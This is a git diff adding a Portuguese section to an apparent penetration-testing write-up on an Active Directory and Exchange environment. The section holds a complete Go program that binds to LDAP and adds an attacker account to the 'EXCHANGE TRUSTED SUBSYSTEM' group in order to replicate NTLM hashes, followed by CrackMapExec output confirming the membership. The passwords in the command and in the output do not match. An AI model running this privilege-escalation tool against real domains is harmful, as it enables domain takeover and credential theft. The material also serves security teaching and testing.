@@ -76,3 +76,86 @@ Porém, temos um problema: não temos nenhum tipo de acesso inicial a algum Wind
 
 A solução foi interagir diretamente com o protocolo LDAP para a adição de nosso usuário ao grupo “EXCHANGE TRUSTED SUBSYSTEM”, para que assim, tenhamos permissão de replicar hashes NTLM. Foi desenvolvido uma ferramenta em Golang que fará a soma do usuário ao grupo.
 
+```go
+package main
+
+import (
+   "fmt"
+   "github.com/go-ldap/ldap/v3"
+   "log"
+)
+
+func main() {
+   ldapServer := "ldap://DOMAINCONTROLLER.dominio.local"
+   ldapUser := "CN=usuario.atacante,CN=Users,DC=dominio,DC=local"
+   ldapPassword := "Senha123456"
+
+   conn, err := ldap.DialURL(ldapServer)
+   if err != nil {
+      log.Fatalf("Não foi possível conectar ao servidor LDAP: %v", err)
+   }
+   defer conn.Close()
+
+   err = conn.Bind(ldapUser, ldapPassword)
+   if err != nil {
+      log.Fatalf("Não foi possível realizar o bind: %v", err)
+   }
+
+   userSearchFilter := "(&(objectClass=user)(objectCategory=person)(sAMAccountName=usuario.atacante))"
+   userSearchBase := "DC=dominio,DC=local"
+   userSearchAttributes := []string{"dn"}
+
+   userSearchRequest := ldap.NewSearchRequest(
+      userSearchBase,
+      ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
+      userSearchFilter,
+      userSearchAttributes,
+      nil,
+   )
+
+   userSearchResult, err := conn.Search(userSearchRequest)
+   if err != nil || len(userSearchResult.Entries) != 1 {
+      log.Fatalf("Erro ao buscar usuário usuario.atacante: %v", err)
+   }
+
+   userDN := userSearchResult.Entries[0].DN
+
+   groupSearchFilter := "(&(objectClass=group)(cn=EXCHANGE TRUSTED SUBSYSTEM))"
+   groupSearchBase := "DC=dominio,DC=local"
+
+   groupSearchRequest := ldap.NewSearchRequest(
+      groupSearchBase,
+      ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
+      groupSearchFilter,
+      []string{"dn"},
+      nil,
+   )
+
+   groupSearchResult, err := conn.Search(groupSearchRequest)
+   if err != nil || len(groupSearchResult.Entries) != 1 {
+      log.Fatalf("Erro ao buscar grupo EXCHANGE TRUSTED SUBSYSTEM: %v", err)
+   }
+
+   groupDN := groupSearchResult.Entries[0].DN
+
+   modify := ldap.NewModifyRequest(groupDN, nil)
+   modify.Add("member", []string{userDN})
+
+   err = conn.Modify(modify)
+   if err != nil {
+      log.Fatalf("Erro ao adicionar usuário ao grupo: %v", err)
+   }
+
+   fmt.Println("Usuário usuario.atacante adicionado ao grupo EXCHANGE TRUSTED SUBSYSTEM com sucesso!")
+}
+```
+
+Com a execução do script acima, para checarmos se fomos de fato adicionados ao grupo especificado, utilizamos a ferramenta [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec), que fará a verificação dos grupos do nosso usuário por meio do módulo "whoami" do protocolo LDAP.
+
+```
+[m1kasa(@massiveattack) ~/ferramentas/CrackMapExec]$ poetry run crackmapexec ldap DOMAINCONTROLLER.dominio.local -u "usuario.atacante" -p 'Senha123456' -M whoami
+SMB         10.10.10.100    445    DC               [*] Windows Server 2016 Build 7601 x64 (name:DC) (domain:dominio.local) (signing:True) (SMBv1:False)
+LDAP        10.10.10.100    389    DC               [+] dominio.local\usuario.atacante:SenhaDoAtacante123 (Pwn3d!)
+WHOAMI      10.10.10.100    389    DC               distinguishedName: CN=usuario.atacante,CN=Users,DC=dominio,DC=local
+WHOAMI      10.10.10.100    389    DC               Member of: CN=EXCHANGE TRUSTED SUBSYSTEM,CN=Builtin,DC=dominio,DC=local
+```
